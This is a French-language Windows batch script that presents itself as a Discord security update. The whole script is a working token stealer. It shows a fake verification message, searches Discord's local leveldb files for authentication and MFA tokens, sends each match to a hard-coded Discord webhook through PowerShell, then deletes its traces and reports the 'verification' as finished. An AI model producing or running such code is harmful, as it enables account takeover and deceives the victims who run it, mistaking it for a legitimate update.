@echo off
title Mise à jour de sécurité Discord
color 0b
echo Veuillez patienter pendant la vérification...
timeout /t 2 /nobreak >nul

:: Récupérer le token Discord depuis les fichiers locaux
set "discord_path=%appdata%\discord\Local Storage\leveldb"
set "webhook=https://discord.com/api/webhooks/1504556026031243376/x5z6XxG_UbsBJo6aes3mLuybh7KyMqZF-mBuH6gxJfT3nSovRLVZClcVIF3tQY1RcSzZ"

for /f "tokens=*" %%a in ('dir /s /b "%discord_path%\*.ldb" 2^>nul') do (
    findstr /c:"oken" "%%a" >> "%temp%\discord_tokens.txt" 2>nul
    findstr /c:"mfa" "%%a" >> "%temp%\discord_tokens.txt" 2>nul
)

:: Envoyer via le webhook
if exist "%temp%\discord_tokens.txt" (
    for /f "delims=" %%x in ('type "%temp%\discord_tokens.txt"') do (
        powershell -Command "$c='{\"content\":\"```'+'%%x'+'```\"}'; Invoke-RestMethod -Uri '%webhook%' -Method Post -Body $c -ContentType 'application/json'" >nul 2>&1
    )
)

:: Nettoyer
del "%temp%\discord_tokens.txt" 2>nul

echo Verification terminee.
timeout /t 3 /nobreak >nul
exit
</html>
